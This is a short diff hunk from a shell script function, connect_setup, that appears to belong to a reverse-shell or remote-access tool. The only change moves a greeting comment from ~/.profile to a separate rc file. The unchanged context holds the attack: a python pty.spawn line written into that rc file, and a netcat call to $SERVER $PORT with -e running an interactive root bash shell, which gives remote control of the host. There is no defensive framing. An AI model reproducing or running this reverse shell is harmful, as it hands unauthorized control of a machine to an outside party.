@@ -135,7 +135,7 @@ connect_setup() {
     # sleep 5 && [ ! $RSRET -eq 120 ] && connect_again_flag=1
 
     [ -z "$(grep pty ~/.profile_rv)" ] && echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> ~/.profile_rv
-    echo "# Welcome and live your life" >> ~/.profile
+    echo "# Welcome and live your life" >> ~/.profile_rv
     $NC -w ${1}s -i 1800s $SERVER $PORT -e "/bin/bash --rcfile /root/.profile_rv -l -i"
 
     RSRET=$?
